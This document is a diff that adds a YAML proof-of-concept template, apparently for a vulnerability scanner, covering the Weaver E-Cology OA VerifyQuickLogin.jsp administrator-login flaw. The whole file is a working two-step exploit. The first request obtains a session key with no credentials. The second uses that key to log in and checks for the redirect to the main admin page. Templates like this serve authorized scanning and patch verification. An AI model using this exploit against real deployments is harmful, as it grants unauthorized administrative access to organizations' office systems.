@@ -1,0 +1,37 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-unsafe_account-CT-483454
+binding: 6b3f0c33-b77f-4355-a8a9-99c715381827
+detail:
+    author: system_user
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/泛微OA/泛微OA%20E-Cology%20VerifyQuickLogin.jsp%20任意管理员登录漏洞.md
+        - https://zhuanlan.zhihu.com/p/562336905
+        - https://www.weaver.com.cn/
+        - https://work.weixin.qq.com/kfid/kfcbb755e1fd954182d
+    vulnerability:
+        id: 2e55f0ea-2fd1-4447-8ddf-a0ec96983dcf
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /mobile/plugin/VerifyQuickLogin.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: identifier=1&language=1&ipaddress=x.x.x.x
+        expression: response.status == 200 && response.body.bcontains(b"{\"sessionkey\":\"") && response.body.bcontains(b"\"message\":\"1\"}")
+        output:
+            search: '"sessionkey\":(?P<id1>.+?)\"".bsubmatch(response.body)'
+            id1: search["id1"]
+            id: replaceAll(string(id1), "\"", "")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /mobile/plugin/plus/login/LoingFromEb.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: loginkey={{id}}
+        expression: response.status == 200 && response.body.bcontains(b"window.location.href=\"/login/RemindLogin.jsp?RedirectFile=/wui/main.jsp\";")
+expression: r0() && r1()
